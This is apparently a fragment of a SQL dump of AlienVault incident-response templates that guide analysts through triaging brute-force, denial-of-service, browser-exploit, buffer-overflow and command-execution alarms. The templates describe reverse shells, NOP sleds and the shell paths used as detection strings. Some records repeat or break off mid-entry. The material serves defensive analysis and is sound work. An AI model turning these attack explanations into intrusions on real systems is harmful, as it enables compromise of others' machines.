ACCESS events differ from AUTHENTICATION messages, in that they usually indicate the behavior after a connection is successfully authenticated (or is accessed without authentication).

Rules are assigned a Reliability Score (out of 10) as a guide, this alarm''s reliability level is (($ALARMRELIABILITY)).\n\nIn general, Attacks are launched from a source machine (($SRCIP)) against a destination machine (($DSTIP)) -  there are some exceptions to this rule however - always consider the content of the events in the Alarm first.\n\n{IF $SRCIP IS IN NETWORKS}\n(($SRCIP)) is a system on your network and may be listed in Inventory. If this Alarm refers to a particular piece of software, be sure to validate that this software is installed, running, and authorized on (($SRCIP))\n\nAttacks often require specialized software to carry out  - locating the software that can perform the attack identified by this alarm, on the source host, is often the evidence that you will be looking for when investigating this alarm.\n{ENDIF}\n{ELSE}\nThe host this attack is originating from: (($SRCIP)) appears to be an external host.

If this account is not unique to (($SRCIP)),it is possible this account may be causing similar issues on other systems, and other alarms involving this user ''(($SRCUSER))'' should be investigated as a follow-up to this alarm .  It is always important to remember that people and credentials are not always one and the same thing - this account may have been previously compromised and being used to launch this attack\n{ENDIF}\n\n{IF $DSTIP IS IN NETWORKS}\nDetermining that an actual attack was successful will require some examination of the target system (($DSTIP)) - depending on the nature of the attack listed in this alarm, this may come in the form of a payload of malicious software to be installed on the target system, or the creation of new access credentials on the system. If the system in question holds information of value to the attacker, the attacker may have just directly accessed  it during the attack. Consider all logs from the target host (($DSTIP)) around the timeframe of this alarm, with particular attention to the modification of access rights on the system, new software running, sensitive information being accessed on the system, or even the system being used as a platform to launch further attacks from.\n{ENDIF}\n\nRemember that not every attack alarm is necessarily an indicator of malicious intent, but when an external host is involved in an Alarm, intent is difficult to determine.

Brute Force attempts are one of the few things in security that are identifiable by their volume, not their type: while a system can be exploited with as little as a single packet of data, brute-force intrusion requires greater numbers to achieve.\n\nThis presents a problem in determining the validity of a brute-force attempt, as opposed to just a broken system. One system repeatedly trying to log into the same account (and failing), over and over again, is visibility different from a single system trying thousands of different accounts and passwords. \n\nNot all brute-force attempts will be about account credentials, any attempt to gain access to something through trial-and-error repetition is a brute force attempt (for instance: trying to find the URI of a hidden page on a webserver by trying every possible set of directory names one after another).\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nAs with all Alarms, determining Intent is the first step to formulating an appropriate response.	\n\nBegin by looking at the individual events that have been logged that triggered this alarm.

There are a wide range of Brute Force toolks available today, if the one listed in the alert is not present, look for similar tools that could achieve the same effect.\n\nBrute Force attacks are noisy and detectable, real attackers avoid using them where possible from inside the target network  Eliminate all possible explanatations for this alarm (especially misconfigured systems) before assigning a malicious intent to this alarm\n{ENDIF}\n\n{IF $SRCIP NOT IN NETWORKS}\nThe host this attack is originating from: (($SRCIP)) appears to be an external host.

As always, first eliminate any possible legitimate explanation for the events in this alarm, before assigning malicious intent to them. Configuration changes at either side of a legitimate connection to a third-party system  will cause large numbers of failed authentications. \n\nAll hosts accessible from the Internet are continually been scanned and attacked from malicious hosts, searching for vulnerable systems to compromise and re-use. While this brute-forcce attempt may therefore be legitimate, it is not necessarily targetted directly at your organization: always cross-reference against other activity from this system (($SRCIP)) to be aware if this host is engaging in further activities beyond an unsuccessful brute-force access attempt. \n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\n  Source host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

In contrast large-scale Distributed Denial of Service attacks are not something you need software to detect - the effects are usually immediately apparent via human observation\n.\nWhere detecting Denial of Service via SIEM becomes important however, is when an attacker temporarily DoS''s a particular system to bypass security or otherwise gain access. (Some systems Fail-Open when under heavy load, for example). As with all alarms, looking for the ''big picture'' at work is critical \n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBegin by looking at the individual events that have been logged that triggered this alarm. If the same exploit-based Denial Of Service alarm is being triggered between a particular pair of hosts (and the destination host is not visibily affected), the alarm is likely a false positive caused by changes in the version of the protocol the two systems are communicating over.\n\n{IF $SRCIP IS IN NETWORKS}\n(($SRCIP)) is a system on your network and may be listed in Inventory. If this Alarm refers to a particular piece of software used to create the brute force attack, be sure to validate that this software is installed, running, and authorized on (($SRCIP)).  \n\nAttacks often require specialized software to carry out  - locating the software that can perform the attack identified by this alarm, on the source host, is often the evidence that you will be looking for when investigating this alarm. There are a wide range of Brute Force toolks available today, if the one listed in the alert is not present, look for similar tools that could achieve the same effect.\n\nExamine the Src/Destination pair and determine if these two systems normally communicate over the listed protocol or service referenced in the (($EVENTDETAIL). Confirming that this is the case, greatly increases the chance that this is a false positive.\n{ENDIF}\n\n{IF $SRCIP NOT IN NETWORKS}\nThe host this attack is originating from: (($SRCIP)) appears to be an external host. This does not necessarily mean that the host is unknown however; it may belong to a third-party organization your enterprise does business with however. As with an internal host, verify if this src/dst pair normally communicates over this protocol or service first. A Denial of Service from an external host has a greater likelihood of being malicious, but if so, the effects are much more likely to be detectable just from human observation of the affected systems.\n{ENDIF}\n\n{IF $DSTIP IS IN NETWORKS}\nValidating that an attack is successful is a vital part of response: with denial of service this is trivial; determine if the system at (($DSTIP)) is still operational, specifically the service listening on port (($DSTPORT)).\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($SRCREPRELIABILITY)) /10 is an indicator \nof how many other organizations have seen malicious activity from this host.\n \nIf the activity listed as occurring from this host matches the activity listed in this alarm, it is highly probable that this alarm indicates active malicious activity against your infrastructure.\n{ENDIF}\n\nFinally, consider the Risk Score (($ALARMRISKSCORE)) /10 - Alarms with higher risks should still be investigated thoroughly, since even if they do not directly indicate malicious activity, they reference assets critical to your business processes, and may indicate failures, misconfigured systems or noncompliant business processes.\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nDenial of Service attacks have two purposes - to attack and harm the organization the systems belong to (often in protest against a particular organization) or to divert atttention away from an intrusion into systems happening elsewhere.\n\nRecovery from a Denial Of Service attack launched against your organization is beyond the scope of this document - if however you believe that a DoS attack is actually a diversion from an attack happening elsewhere (e.g. the DoS attack is launched against non-public, non-business critical systems, such as a Security device itself), examination of any other activity during this time is necessary. This will be made difficult either by the sheer volume of logs to search through, or conversely, a complete lack of logs. (depending on the nature of the DoS attack - some flood systems with activity, others cause systems to crash or be unable to keep pace with and record all activity).  Examining local logs on systems may be required, as network-level controls become unable to fully record all activity (flooding Intrusion Detection systems with traffic, is a common way of preventing an IDS from logging an observed attack signature).\n{ENDSECTION}', '2012-11-08', '0', ''),

Zone transfers should only occur between trusted DNS servers, often within the same organization, since a DNS Zone often contains a list of all known systems on the network.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\n\n{IF $SRCIP IS IN NETWORKS}\n\n{ENDIF}\n\n{IF $SRCUSER NOT EMPTY}\n\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

(10109, '0', 'AlienVault Incident Response: Denial Of Service', '{SECTION INTRODUCTION}\nA possible Denial-Of-Service attack has been detected via correlating events seen on the network. Denial of Service attacks come in two variants and two methods: directed and distributed, consumption and exploitation.\n\nDirect Denial of service attacks usually originate from a single system, using a particular software exploit to crash remote services and systems. Distributed attacks use many source systems, to consume all available resources on the target systems. The exploit variety of DoS can be one of the most common false-positive alarm types however. In contrast large-scale Distributed Denial of Service attacks are not something you need software to detect - the effects are usually immediately apparent via human observation\n.\nWhere detecting Denial of Service via SIEM becomes important however, is when an attacker temporarily DoS''s a particular system to bypass security or otherwise gain access. (Some systems Fail-Open when under heavy load, for example). As with all alarms, looking for the ''big picture'' at work is critical \n\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBegin by looking at the individual events that have been logged that triggered this alarm. If the same exploit-based Denial Of Service alarm is being triggered between a particular pair of hosts (and the destination host is not visibily affected), the alarm is likely a false positive caused by changes in the version of the protocol the two systems are communicating over.\n\n{IF $SRCIP IS IN NETWORKS}\n(($SRCIP)) is a system on your network and may be listed in Inventory. If this Alarm refers to a particular piece of software used to create the brute force attack, be sure to validate that this software is installed, running, and authorized on (($SRCIP)).  \n\nAttacks often require specialized software to carry out  - locating the software that can perform the attack identified by this alarm, on the source host, is often the evidence that you will be looking for when investigating this alarm. There are a wide range of Brute Force toolks available today, if the one listed in the alert is not present, look for similar tools that could achieve the same effect.\n\nExamine the Src/Destination pair and determine if these two systems normally communicate over the listed protocol or service referenced in the (($EVENTDETAIL). Confirming that this is the case, greatly increases the chance that this is a false positive.\n{ENDIF}\n\n{IF $SRCIP NOT IN NETWORKS}\nThe host this attack is originating from: (($SRCIP)) appears to be an external host. This does not necessarily mean that the host is unknown however; it may belong to a third-party organization your enterprise does business with however. As with an internal host, verify if this src/dst pair normally communicates over this protocol or service first. A Denial of Service from an external host has a greater likelihood of being malicious, but if so, the effects are much more likely to be detectable just from human observation of the affected systems.\n{ENDIF}\n\n{IF $DSTIP IS IN NETWORKS}\nValidating that an attack is successful is a vital part of response: with denial of service this is trivial; determine if the system at (($DSTIP)) is still operational, specifically the service listening on port (($DSTPORT)).\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($SRCREPRELIABILITY)) /10 is an indicator \nof how many other organizations have seen malicious activity from this host.\n \nIf the activity listed as occurring from this host matches the activity listed in this alarm, it is highly probable that this alarm indicates active malicious activity against your infrastructure.\n{ENDIF}\n\nFinally, consider the Risk Score (($ALARMRISKSCORE)) /10 - Alarms with higher risks should still be investigated thoroughly, since even if they do not directly indicate malicious activity, they reference assets critical to your business processes, and may indicate failures, misconfigured systems or noncompliant business processes.\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nDenial of Service attacks have two purposes - to attack and harm the organization the systems belong to (often in protest against a particular organization) or to divert atttention away from an intrusion into systems happening elsewhere.\n\nRecovery from a Denial Of Service attack launched against your organization is beyond the scope of this document - if however you believe that a DoS attack is actually a diversion from an attack happening elsewhere (e.g. the DoS attack is launched against non-public, non-business critical systems, such as a Security device itself), examination of any other activity during this time is necessary. This will be made difficult either by the sheer volume of logs to search through, or conversely, a complete lack of logs. (depending on the nature of the DoS attack - some flood systems with activity, others cause systems to crash or be unable to keep pace with and record all activity).  Examining local logs on systems may be required, as network-level controls become unable to fully record all activity (flooding Intrusion Detection systems with traffic, is a common way of preventing an IDS from logging an observed attack signature).\n{ENDSECTION}', '2012-11-08', '0', ''),

ActiveX is a Microsoft technology to embed executable code within a web page served to a client browser. Pages may also contain commands to be executed by ActiveX applications already present on the client browser, and these may be constructed to exploit weaknesses in these controls and manipulate them into executing malicious code within the victim''s web browser. ActiveX is specific to the Microsoft Internet Explorer browser and although being replaced in favor of new web technologies still maintains a prescence in many enterprise intranet applications.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nActiveX is distributed as binary executable format as .OCX files and may be interacted with on a web page via scripting languages (such as Javascript or VBscript). Although ActiveX itself has certain defences to prevent browsers from downloading and installing malicious ActiveX objects (via code signing and blacklisting), vulnerabilities exist in trusted ActiveX objects that may be exploited to inject malicious code into them. The Internet Explorer browser makes extensive use of ActiveX objects to display non-standard content types within the browser (Office documents, Video files, etc) which default to being trusted to operate within any web page. An attacker only needs to manipulate the victim into browsing malicious content (a web page containing javascript that interacts with an ActiveX object and exploits a buffer overflow in it, for example).

(10111, '0', 'AlienVault Incident Response: Exploit / Attack Response', '{SECTION INTRODUCTION}\nThis event indicates that a service running on a host has responded in a manner consistent with being attacked via a software exploit. Events in this category do not necessarily indicate a successful compromise of a system, only common responses from systems when an attack is being attempted. Since many of these responses also occur occasionally in the course of normal usage of a system, these events are usually only significant when in unusual volume within the context of a single client.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBegin by looking at the individual events that have been logged that triggered this alarm and the KDB article for the rule itself to understand what the alarm intends to indicate: False positives are possible with many types of Alarms and your first priority should be to validate that what the alarm is designed to detect, is what has actually happened. Rules are assigned a Reliability Score (out of 10) as a guide, this alarm''s reliability level is (($ALARMRELIABILITY)).\n\nMuch of the software communication detected in the Attack-Response category comprises normal (if uncommon) error messages. Unsuccessful Exploits are most likely to generate an error response from the target software (although it is not uncommon for an incomplete exploit to crash the target instead).\n\nAttack Response events give context to other events in the exploit category, revealing when an attacker is attempting several exploit attempts unsuccessfully, potentially even when the attack itself is not detected by other methods.\n\nSince ordinary users may also generate the same error messages in the course of normal usage of a system, it is the pattern and context of Attack Response events that is most important - for example, when regular users encounter an Error 500 (Internal Server Error) on a webapp, they usually back out and reload a working page; whereas an attacker may re-request the same page, using different data in the HTTP POST request, several times in a row until they find success. Similarly, ordinary users do not request a series of numerous missing pages (Error 404) one after another, but an automated web vulnerability scanner is easily discernable by this behavior.\n\nAttack Response events are triggered after the exploit attempt itself, and while they may contain some information about the exploit attempt (in the form of the error response from the application), they are only an indicator; other traffic in the same session to (($DSTIP)) must be examined to locate the potential exploitation attempt, beginning with the activity immediately prior to the Attack Response event.\n\n{IF $SRCIP IS IN NETWORKS}\nThe client in the connection this event triggered on is located on your organization''s internal network. Depending on the exploit method this event indicates, there may be software located on the system (($SRCIP)) used to carry out the attack (especially if the pattern of Attack Responses indicates some level of automation), but this is not necessary for all exploit methods (particularly in the case of web applications).\n{ENDIF}\n{ELSE}\nThe client in this connection appears to be an external host, though this does not automatically indicate that an attack is in progress. Validate that the external system has a valid business reason to be communicating with the server at (($DSTIP)) and that any credentials in the session correspond to what they should be using. \n{ENDELSE}\n\nThe system at (($DSTIP)) may have internal logs that describe in more detail the request that caused the attack response, and activity immediately before and after this event should be examined for any supporting evidence. Additionally cross-reference for the same request originating from the client system (($SRCIP)) to other destinations to determine if it is attempting the same attack method to multiple targets.\n\n{IF $SRCREPACTIVITY NOT EMPTY}\n  Source host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

Specific Rectification details are determined by which attack method (if any) is detected in the course of investigating this event. \n\nMany attack response events are triggered from unusual error messages, which may not indicate an attack in progress, but a misconfigured client (or if large numbers of clients are involved, the server itself) that must be rectified by administration personnel.\n\n{ENDSECTION}', '2012-11-08', '0', ''),
(10112, '0', 'AlienVault Incident Response: Exploit / Browser', '{SECTION INTRODUCTION}\nThis event indicates that a possible attack targetting a client Web Browser has been detected by a system or security control. Attacks against browsers operate by presenting malicious content in a location where it will be downloaded by the potential victim and rendered within a web browser, exploiting a vulnerability in the way the browser renders that content. Browser exploits may have a range of effects, from the execution of malicious executable code by the account the browser is running as, to information leakage and deception of the person operating the browser.\n\nBrowser attacks may incorporate one or more exploitation methods, but almost always require a component of manipulating an end-user into pulling down malicious content from a remote server - either by social engineering techniques such as Phishing, or by embedding malicious code into sites already trusted by the user (in the case of Drive-By-Downloads)\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBrowser exploits are unusual when viewed in the context of a network connection, being a rare case where the client side of a TCP connection is the victim, not the attacker. (although individual packet-level analysis will still show the packet source being the server, the destination being the browser). \n\nOpening a single page in a modern website may involve tens (sometimes hundreds) of individual HTTP requests, many to servers outside the one the main page is being served on (advertising sources being an obvious case, but also many API''s for identify and tracking systems are commn, especially with the popularity of integration with social media). When analyzing a client-side attack, reconstructing what was happening in the user''s browser is often the first step to determining the nature of this event. Since browser attacks are almost always over HTTP, the prescence of a web proxy (and the associated request log) can be a great boon in analysis and reconstruction.\n\nIn many cases, whatever content was accessed that triggered this event may still be accessible at the same URI, allowing direct access and analyis of it (remember to use tools that do not attempt to render web content however - the wget http client is always recomended for this task).\n\nBrowser exploits often combine two particular technologies in their construction: embedable objects (such as java applets, video files and Adobe Flash objects) and a scripting language (almost always javascript).Each of these object types is a distinct HTTP request with it''s own URI it is retrieved from, although javascript may also be embedded into HTML. This allows for the common case where a browser is accessing a trusted page, that includes links to malicious content that is rendered as part of that page and executes the attack. Commonly exploitable webapplications (such as various blogging software) is a common target for attackers to inject malicious content into, to reach a wide number of victims.\n\n{IF $SRCIP IS "80"}\n{IF $SRCIP IS IN NETWORKS}\nThe webserver in this event, (($SRCIP)) is listed as being on your organization''s internal network. Assuming that $((SRCIP)) is an accounted for, official system with a known business purpose, the potential for this event to be a false positive is much greater, though it is not impossible that the server may have been compromised to serve malicious code. Examination of the URI being accessed that triggered this event is a priority (is it known by the administrator of (($SRCIP)) to be a URI normally present on this system?). \nNote: this preceding paragraph may be misleading\n{ENDIF}\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\nSource host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($SRCREPRELIABILITY)) /10 is an indicator of how many other organizations have seen malicious activity from this host. Malicious web content must be served from semi-fixed locations on the internet and these systems may be used by attackers for other purposes - if $SRCREPACTIVITY does not seem to match this event type, it is not necessarily an indicator that this event is false.\n\nAdditionally, legimate sites may be compromised into delivering malware to their visitors, so the presence of an otherwise legitimate being marked by the reputation system is a strong indicator of that.\n{ENDIF}\n\n{IF $DSTREPACTIVITY NOT EMPTY}\nSource host (($DSTIP)) is known to the reputation system, and has been observed as a source of (($DSTREPACTIVITY)) by subscribers to the Open Threat Exchange. The associated Reliability Score: (($DSTREPRELIABILITY)) /10 is an indicator of how many other organizations have seen malicious activity from this host. Malicious web content must be served from semi-fixed locations on the internet and these systems may be used by attackers for other purposes - if (($DSTREPACTIVITY)) does not seem to match this event type, it is not necessarily an indicator that this event is false.\n\nAdditionally, legimate sites may be compromised into delivering malware to their visitors, so the presence of an otherwise legitimate being marked by the reputation system is a strong indicator of that.\n{ENDIF}\n\nA successful browser compromise will almost always be followed up by additional web requests by the browser, usually to download the intended payload to obtain a permanent foothold on the victim system (very often, this request will be to an entirely different system than the one the exploit content is hosted on). These requests will often occur very shortly after the initial exploit content is delivered, within a matter of seconds at most.\n\nMachines compromised by client-side attacks will need to reach out to an external command-and-control system to recieve further instructions once compromised, these connections may also be detected in other events and alerts; however the nature of these requests can vary greatly depending on the purpose of the payload and may not even begin for some length of time after tthe immediate infection.\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nThe most common usage of browser exploits is the delivery of botnet agents to compromised machines to turn them into zombie systems used for delivering spam, taking part ijn DDos attacks and numerous other criminal activitiies.  Browser exploits are the optimum tool for this purpose, since great numbers of end-users can be compromised from visiting a single piece of malicious content on the internet, without having to locate potential victims individually.Financial theft malware also requires the acquisition of large numbers of anonymous victims and is also a common payload..\n\nConversely, browser exploits can be used in an extremely targetted fashion, where content at a unique URI is created for a specific victim, who is then tricked into accessing that URI via social engineering techniques (spearphishing via email being the most commonly favored technique). here, the payload is often a stealhy remote access tool that gives the attacker direct control over the compromised system, allowing them to use whatever access rights the compromised system and its user have to further migrate into the target network, usually abandoning the remote access tool in favor of using the legitimate remote access credentials of users on the network as soon as possible.\n\nIn all cases, browser attacks rely on the client connecting outward to retrieve and execute content that will inject code into the browser, to perform actions of the attacker''s choosing. The success of browser based attacks often lies with browser software deployed in organizations often being outdated (in order to maintain compatability with internal web applications).\n\nIf HTTP Proxy logs are available, browser attacks can be some of the simplest to contain and rectify, as once a particular URI containing malicious content is identffied, cross-checking the logs to any other potential victims of the attack becomes trivial, conversely, if clients are allowed to access the web directly, browser exploits are likely to be the single highest source of compromise to the infrastructure.\n\nThe impact of client-side attacks such as browser exploits is so great due to the exploitation of the trust mechanisms involved, (hijacking that of the end-user ) and are best mitigated against by the same practises that would protect against an attack from an inside agent - seperation of duties, compartmentalization of data, and a security monitoring structure that is built into the fabric of the organizations network infrastructure, not merely the outer perimeter.\n\nSince client systems often have inferior logging configurations compared to production servers and equipment, reconstruction of the attack often will require specialized forensic examination of the system, via on-disk and in-memory tools. \n\n{ENDSECTION}', '2012-11-08', '0', ''),
(10113, '0', 'AlienVault Incident Response: Exploit / Buffer Overflow', '{SECTION INTRODUCTION}\nThis event indicates that possible Buffer Overlow attach has detected by a system or security control. Buffer Overflows are an extremely common form of exploiting software to cause it to execute malicious code injected by an attacker, and although there are many technologies in use to mitigate buffer overflow vulnerabilities in software, they continue to emerge in software.\n\nA Buffer Overflow vulnerability exists where a piece of software will accept more data into a data input field, than it has reserved memory to store that data in; since the data is accepted, it must go somewhere, and it overwrites whatever was in memory in the space following the area assigned for data input. If the previous content of this area contained parts of the software''s code, when the software tries to execute the functions that previously resided in that area, they will instead execute whatever was contained in the data sent by the attacker.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nBuffer Overflow attacks rely upon a target application accepting more data than it has reserved space to store - since this changes from application to application (and version to version), most detections for buffer overflow attacks are specific to an application+version combination. \n\nCommon across buffer overflow exploits however, is the use of the "NOP Sled",  a long series of bytes with hex value 0x90 (the machine code value for NOP - ''No Operation'') appended into the buffer overflow data to wipe over an area of memory that the target program will eventually call a function from. Since the exact value cannot be known, an area of ''do nothing'' is written roughly in the area the program will jump to a function in, and procedure to execute each NOP command until it finally reaches the malicious code delivered via the exploit.\n\nThis series of 0x90 bytes is not unique to buffer overflow exploits however, and can be found in other data transferred over the network, triggering a false positive event.\n\nBuffer overflows often work in tandem with shellcode as a means of delivering executable code over a channel designed for text input, and the presence of shellcode events in the same network connection as a buffer overflow event is a strong indicator of an actual exploit being delivered.\n\nBuffer overflows are, for the most part, a by-product of the language the software was written in - lower-level languages such as C, require the developer to first allocate memory for data, and then move data into that space - since the move operation is independant of the allocation operation, it has no way of knowing how much space has been allocated. Conversely, managed languages (such as most interpretted languages) maintain their own internal model underneath the operations usable to the developer, and make most common buffer overflow methods extremely unlikely to be successful.\n\n{IF $DSTPORT IS "80"}\nThis event was detected in a session to a webserver; although buffer overflows in web applications are uncommon (due to the vast majority of applications being written in managed languages), however they can target the underlying web server software (and supporting applications), including security mechanisms such as SSL/TLS. Since many web applications will allow the transfer of arbitary file types (that may contain sequences of data in them that can trigger buffer overflow detection mechanisms) is it important to determine the context in which this event was triggered. The content of the HTTP headers should be examined first to determine the nature of this interaction with the server.\n{ENDIF}\n\nSuccessful exploitation of a buffer overflow vulnerability often requires a specific release version of the target software - an older version of the software does not automatically guarantee success, since the internal layout of the softwares code may be radically different from what the exploit is expecting to find, or new functionality is introduced that creates the vulnerability. Even when a buffer overflow is not completely successful however, the probability that it will cause the target software to crash is extremely high, and this can be a strong indicator that an actual attack was attempted.\n\n{IF $SRCIP IS IN NETWORKS}\nThis exploit event appears to be originating from a system within your organization - (($SRCIP))\n\nBuffer Overflow Attacks require software to carry out, which may distributed in the form of source code to be compiled into a binary, or the binary executable itself. (additionally there are toolkits containing many such exploits. Inspecting the storage on (($SRCIP)) may locate any particular tools used to perform this exploit; however if (($SRCIP)) itself has been compromised by an attacker and is now being used to attack from, those tools may be hidden in unusual locations on the system.\n{ENDIF}\n{ELSE}\nThis exploit event appears to be originating from a system outside your organization - (($SRCIP)). Investigate if this System is unknown to your organization before presuming an external attacker - this outside party may well have legitimate reasons to be communicating with your systems and is just as likely to cause false positive events where appropriate. Examine other traffic in the same time period from (($SRCIP)) to find any additional evidence of an attack in progress.

A remote buffer overflow exploit against service software with limited access rights, may be followed up by the transfer and execution of different, local exploit to elevate privileges on the system - this pattern is similar for exploits against desktop application software, where the initial exploit payload will download a malware kit to take elevated control of the target system.\n\nAfter a successful exploitation of vulnerable software, the initial actions will be performed by the account that software runs under - if the account is used purely as a service account, search for activity on (($DSTIP)) from that account that does not match normal activity for that service.\n\n{ENDSECTION}\n\n{SECTION RECTIFICATION}\nBuffer overflows are a software vulnerability introduced by insecure programming practises in the sanitization and parsing of User Input. Although certain technologies which are designed to detect and intercept buffer overflows from operating successfully, these can be bypassed with time and determination.  The impact of a buffer overflow vulnerability is that an attacker injects their own executable code into the exploited software, granting the attacker access to anything the software has access to, which will be logged under the account the software is operating under.\n\nModern systems contain protections against buffer overflows (e.g. DEP and ASLR) that should be enabled where possible on systems that support them. As with many software vulnerabilities, the only sure rectification is to upgrade the software to a version where the vulnerability has been addressed (or apply an interim patch). \n\nSince buffer overflows are limited in effectiveness by the nature and access rights of the software they target, software that provides a network service (such as a webserver) should be configured in a least-privilege fashion, where the account the software operates under has only the bare minimum rights to perform its task. \n\nDesktop Apps are equally susceptible to buffer overflows (especially where components of an application are usable within other applications - e.g. embedding an Adobe Flash object within a Microsoft Word document) - restricting access for these applications is generally difficult to configure and largely left to specialized endpoint security applications.\n\n{ENDSECTION}', '2012-11-08', '0', ''),
(10114, '0', 'AlienVault Incident Response: Exploit / Command Execution', '{SECTION INTRODUCTION}\nThis event indicates a possible attack against a system , based on the prescence of system commands in a network communication. Most normal application protocols do not contain filenames to executables on the system (e.g. C:\\WINDOWS\\CMD.EXE) and so the prescence of these text strings in data or commands may indicate an exploit payload (where the text indicates commands to be executed by the victim system once successfully exploited).\n\nAlthough some simple vulnerabilities are classified under Command Execution (usually where user input to an application is used to construct arguments to an external command is not parsed correctly, allowing an attacker to run commands directly via the input) in general Command Execution events will identify the payload following an exploit. Web applications are a notable exception however, with vulnerable web applications accepting input that does not match any particular exploitation technique, but causes a poorly-constructed webapp to execute system commands on the attacker''s behalf.\n\nCommand Execution may be found  across many classes of exploit, since using software already present on the system is far easier and generally more stealthy that uploading custom tools to the victim host. This technique works across across many different platforms and targets once some level of access to the operating system itself is obtained. Often they will be preceded by the detection of an exploit event, and are an excellent source for verifying that an exploit event is an actual attack in progress.\n{ENDSECTION}\n\n{SECTION ANALYSIS}\nAlthough detection methods for Command Execution will make best effort to exclude monitoring these protocols, there are several established protocols whose sole purpose is to issue commands to be run on a remote system (the venerable telnet protocol being the primary example). The administrative interfaces of certain web applications may allow the administrator to pass command lines to execute software locally on the server, and there are numerous proprietary application-specific protocols that may do the same. Although these may seem to be a large source of false positives at first, many of these systems (when deployed correctly) should communicate via an encrypted channel, and the text strings that match system commands undetectable outside of the server.\n\nAdditionally some detection methods may identify strings for system commands within transferred document (e.g. a PDF instruction manual for software), in these situations it may not be possible for detection software to differentiate between actual content and an embedded malicious payload, a trivial task for a human observer however.\n\nThe first concern when investigating a Command Execution event, is the string that is flagged as a system command. These will differ in format from system to system and require specific knowledge of the executables installed on a system to understand the implications of what a particular command''s function and effect is. One particular command set occurs far more often than others however, the execution of a shell program (a command-line interface) to allow further commands to be sent to the compromised system. A common technique is to open a connection back from the compromised host, to the host being used by the attacker to launch the attack (the connection is sent from the compromised machine to bypass incoming firewall rules and NAT) and present the attacker with a full commandline to the host, a technique known as a Reverse Shell. Although many exist, the two most common shell programs encountered are:\n\n		C:\\WINDOWS\\CMD.EXE  -the Windows command line interface\n		/bin/bash                    - the default Linux command line interface.\n\nMany other options exist however, but these strings are commonly used to identify potential command execution as part of an active exploit. Other executables may be involved, including ones transferred to the system via other methods: for example, a web application may allow the uploading of an executable, by renaming it as a compatible image file format that is then executed via exploiting another aspect of the web application.\n\n{IF $DSTPORT IS "80"}\nThis event is directed towards a web application (one of the scenarios where Command Execution is both exploit and payload) and should be cross-referenced against the request log from the webserver it resides on at (($DSTIP)). If complete HTTP headers for the connection that triggered this event are available, examine the MIME-Type listed in the header - formed-encoded is of concern since this is the primary method of sending input values to a web application and cross-reference with headers and content from ordinary usage of the application to determine if the request is unusual for the system. \n\nPHP Web Applications in particular have a long history of command execution vulnerabilities - applications are constructed from several .php scripts, and implementation of the webapp may execute a particular script  based on user interaction with the application. if the application does not enforce the list of values that are accepted, or allows the user to define a PHP variable value before the script itself does, an attacker is free to supply their own value, which executes a command outside of the web application.\n{ENDIF}\n\n{IF $SRCIP IS IN NETWORKS}\nThe system the command execution event originates from, (($SRCIP)) is a system on your organization''s internal network. This may increase the probability that the event is a false positive (or at least, it is legitimate usage).  Command Execution of a basic shell is a common way of testing if a vulnerability was successfully exploited in many automated vulnerability scanners, and is often included in ''off-the-shelf'' exploit code from the internet. Not all command execution (especially when targetting webapps) requires specialized tools however, and there may be no evidence on (($SRCIP)) to corroborate the event, with the possible exception of an HTTP Application Proxy (such as SpikeProxy) that allows the modification of HTTP requests and responses, between browser and webserver.\n{ENDIF}\n\n{IF $SRCREPACTIVITY NOT EMPTY}\n  Source host (($SRCIP)) is known to the reputation system, and has been observed as a source of (($SRCREPACTIVITY)) by subscribers to the Open Threat Exchange.

As a vulnerability it is the result of insecure programming practises (primarily in web applications) and must be addressed by updating the software or fixing the code directly. As a payload however, command execution is directly affected by the configuration of the target machine, and its effects may be mitigated by least-privilege practises - if a webserver is only designed to serve incoming requests, it can be denied the right to initiate new connections out to the internet (thereby preventing a reverse shell from being set up over an outbound network connection). \n\nA successful command execution may continue to recieve commands from the attacker, or act autonomously after the first command (if for instance, that first command is to download and acquire a rootkit). Netflow traffic from (($DSTIP)) (as the source this time) may reveal details. Although most operating systems contain the capability for details process accounting (a list of what commands were run by what user) this feature is often left in a minimal state that may reveal little or no detail. More detailed forensic methods (memory and filesystem log analysis) may reveal the attacker''s actions after the initial exploitation.\n\nOnce an attacker has compromised software running under a limited-rights account, their next step is often to elevate those privileges on the local system. Additional exploits or entire rootkits (in binary form or sometimes as source code or script file) will be downloaded to the victim system and used to maintain a foothold, elevate privileges and attack other target systems from a trusted source.\n\n{ENDSECTION}', '2012-11-08', '0', ''),
